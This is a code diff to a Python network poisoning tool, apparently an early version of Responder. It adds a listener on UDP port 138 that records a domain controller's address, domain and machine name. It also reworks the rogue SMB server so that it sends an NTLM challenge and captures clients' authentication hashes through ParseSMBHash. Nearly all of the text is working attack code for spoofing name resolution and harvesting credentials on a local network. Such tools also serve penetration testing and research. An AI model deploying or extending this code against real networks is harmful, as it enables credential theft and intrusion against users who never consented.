@@ -183,6 +183,39 @@ class NB(SocketServer.BaseRequestHandler):
                     pass
 
 ##################################################################################
+#Browser Listener
+##################################################################################
+def FindPDC(data,Client):
+    DataOffset = struct.unpack('<H',data[139:141])[0]
+    BrowserPacket = data[82+DataOffset:]
+    if BrowserPacket[0] == "\x0c":
+       Domain = ''.join(tuple(BrowserPacket[6:].split('\x00'))[:1])
+       if Domain == "WORKGROUP":
+          print "[Browser]Received announcement for Workgroup.. ignoring"
+       if Domain == "MSHOME":
+          print "[Browser]Received announcement for MSHOME.. ignoring"
+       else:
+          print "[Browser]PDC ip address is: ",Client
+          logging.warning('[Browser] PDC ip address is: %s'%(Client))
+          print "[Browser]PDC Domain Name is: ", Domain
+          logging.warning('[Browser]PDC Domain Name is: %s'%(Domain))
+          ServerName = BrowserPacket[6+16+10:]
+          print "[Browser]PDC Machine Name is: ", ServerName
+          logging.warning('[Browser]PDC Machine Name is: %s'%(ServerName))
+    else:
+       pass
+      
+class Browser(SocketServer.BaseRequestHandler):
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+       self.socket.setblocking(0)
+
+    def handle(self):
+        request, socket = self.request
+        FindPDC(request,self.client_address[0])
+
+##################################################################################
 #SMB Server
 ##################################################################################
 from SMBPackets import *
@@ -190,12 +223,21 @@ from SMBPackets import *
 
 #Detect if SMB auth was Anonymous
 def Is_Anonymous(data):
-    LMhashLen = struct.unpack('<H',data[51:53])[0]
-    if LMhashLen == 0 or LMhashLen == 1:
-       print "SMB Anonymous login requested, trying to force client to auth with credz."
-       return True
-    else:
-       return False
+    SecBlobLen = struct.unpack('<H',data[51:53])[0]
+    if SecBlobLen < 220:
+       SSPIStart = data[75:]
+       LMhashLen = struct.unpack('<H',data[89:91])[0]
+       if LMhashLen == 0 or LMhashLen == 1:
+          return True
+       else:
+          return False
+    if SecBlobLen > 220:
+       SSPIStart = data[79:]
+       LMhashLen = struct.unpack('<H',data[93:95])[0]
+       if LMhashLen == 0 or LMhashLen == 1:
+          return True
+       else:
+          return False
 
 #Function used to know which dialect number to return for NT LM 0.12
 def Parse_Nego_Dialect(data):
@@ -318,34 +360,34 @@ class SMB1(SocketServer.BaseRequestHandler):
                 data = self.request.recv(1024)
                 ##Session Setup AndX Request
               if data[8:10] == "\x73\x00":
-                if Is_Anonymous(data):
-                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))
-                   final = SMBSessEmpty()###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
-                   packet1 = str(head)+str(final)
-                   buffer1 = longueur(packet1)+packet1  
-                   self.request.send(buffer1)
-                else:
-                   head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
-                   t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
-                   t.calculate()
-                   final = t 
-                   packet1 = str(head)+str(final)
-                   buffer1 = longueur(packet1)+packet1  
-                   self.request.send(buffer1)
-                   data = self.request.recv(4096)
-                   if data[8:10] == "\x73\x00":
-                      ParseSMBHash(data,self.client_address[0])
-                      head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-                      final = SMBSession2Accept()
-                      final.calculate()
-                      packet2 = str(head)+str(final)
-                      buffer2 = longueur(packet2)+packet2  
-                      self.request.send(buffer2)
-                      data = self.request.recv(1024)
+                 head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
+                 t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
+                 t.calculate()
+                 final = t 
+                 packet1 = str(head)+str(final)
+                 buffer1 = longueur(packet1)+packet1  
+                 self.request.send(buffer1)
+                 data = self.request.recv(4096)
+                 if data[8:10] == "\x73\x00":
+                    if Is_Anonymous(data):
+                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))
+                       final = SMBSessEmpty()###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+                       packet1 = str(head)+str(final)
+                       buffer1 = longueur(packet1)+packet1  
+                       self.request.send(buffer1)
+                    else:
+                       ParseSMBHash(data,self.client_address[0])
+                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                       final = SMBSession2Accept()
+                       final.calculate()
+                       packet2 = str(head)+str(final)
+                       buffer2 = longueur(packet2)+packet2  
+                       self.request.send(buffer2)
+                       data = self.request.recv(1024)
              ##Tree Connect IPC Answer
               if data[8:10] == "\x75\x00":
                 ParseShare(data)
-                head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", tid="\x00\x00", uid=uidcalc(data), mid=midcalc(data))
+                head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
                 t = SMBTreeData()
                 t.calculate()
                 final = t 
@@ -726,6 +768,7 @@ def main():
       Is_SQL_On(SQL_On_Off)
       ## Poisoner loaded by default, it's the purpose of this tool...
       thread.start_new(serve_thread_udp,('', 137,NB))
+      thread.start_new(serve_thread_udp,('', 138,Browser))
       thread.start_new(RunLLMNR())
     except KeyboardInterrupt:
         exit()
